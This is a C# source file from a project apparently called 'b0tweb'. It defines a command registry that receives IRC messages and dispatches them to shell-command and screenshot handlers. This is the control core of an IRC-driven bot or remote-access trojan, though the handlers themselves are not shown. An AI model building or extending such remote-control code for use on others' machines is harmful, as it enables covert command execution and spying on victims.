using System;
using System.Threading;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace b0tweb.Commands
{
    static class CommandRegistry
    {
        private static AbstractCommand[] _supportedCommands = { 
            new CMDCommand(), 
            new ScreenshotCommand(),
        };

        /// <summary>
        /// Tries to find a supported command given the irc message
        /// </summary>
        /// <param name="ircMessage">The message received via IRC.</param>
        /// <returns>The command if it's supported, null otherwise</returns>
        public static AbstractCommand Find(string ircMessage)
        {
            return Array.Find(_supportedCommands, command => command.Matches(ircMessage));
        }

        /// <summary>
        /// If the ircMessage abides by the protocol and describes a supported command
        /// that respective command will be executed asynchronously in a seperate thread.
        /// </summary>
        /// <param name="ircMessage">The message received via IRC.</param>
        public static void ExecuteAsync(string ircMessage)
        {
            Thread executionThread = new Thread(() => ExecuteSync(ircMessage));

            executionThread.Start();
        }

        /// <summary>
        /// If the ircMessage abides by the protocol and describes a supported command
        /// that respective command will be executed synchronously.
        /// </summary>
        /// <param name="ircMessage">The message received via IRC.</param>
        public static string ExecuteSync(string ircMessage)
        {
            AbstractCommand matchingCommand = CommandRegistry.Find(ircMessage);

            if (matchingCommand == null) // no command found
            {
                return "Command not found!";
            }

            return matchingCommand.Execute(ircMessage);
        }
    }
}
